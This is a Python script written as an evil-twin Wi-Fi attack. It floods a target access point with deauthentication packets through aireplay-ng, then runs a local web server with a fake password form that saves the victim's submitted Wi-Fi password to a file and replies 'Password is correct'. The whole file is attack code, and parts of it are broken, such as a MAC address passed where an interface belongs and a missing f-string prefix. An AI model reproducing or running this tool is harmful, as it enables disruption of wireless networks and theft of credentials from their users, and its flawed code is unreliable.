import os
import sys
import time
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

SSID = input("Write target SSID: ")
TARGET_MAC = input("Write Target wifi Mac Address: ")

os.system(f"sudo airmon-ng start {TARGET_MAC}")
os.system(f"sudo aireplay-ng -0 10000 -a {TARGET_MAC} {TARGET_MAC}")

def server_thread():
    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"""
                    <html>
                        <head>
                            <title>Password Input</title>
                        </head>
                        <body>
                            <form method="POST" action="/submit">
                                <label for="password">Password:</label>
                                <input type="password" id="password" name="password" required>
                                <input type="submit" value="Submit">
                            </form>
                        </body>
                    </html>
                """)

        def do_POST(self):
            if self.path == "/submit":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                content_length = int(self.headers.get("Content-length"))
                post_data = self.rfile.read(content_length).decode("utf-8")
                password = post_data.split("=")[1]
                with open("Password.txt", "w") as f:
                    f.write(password)
                self.wfile.write(b"<html><body>Password is correct</body></html>")
                sys.exit(0)

    server = HTTPServer(("", 80), RequestHandler)
    server.serve_forever()

try:
    threading.Thread(target=server_thread).start()
    time.sleep(15)
    os.system("sudo airmon-ng stop {TARGET_MAC}")
    os.system("sudo service network-manager restart")
except KeyboardInterrupt:
    pass